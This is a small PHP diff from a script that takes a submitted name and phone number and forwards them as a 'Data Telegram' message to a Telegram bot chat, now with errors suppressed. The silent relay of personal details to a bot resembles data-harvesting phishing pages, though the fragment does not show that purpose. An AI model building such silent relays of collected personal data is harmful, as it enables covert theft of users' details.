@@ -19,6 +19,6 @@ $_SESSION['phone'] = $phone;
 
 $message = "*Data Telegram*\nNama : $name\nNomor : $phone";
 $url = "https://api.telegram.org/bot$telegramBotToken/sendMessage?chat_id=$telegramChatID&text=" . urlencode($message) . "&parse_mode=Markdown";
-file_get_contents($url);
+@file_get_contents($url);
 
 echo json_encode(["status" => "success", "message" => "Data berhasil dikirim."]);
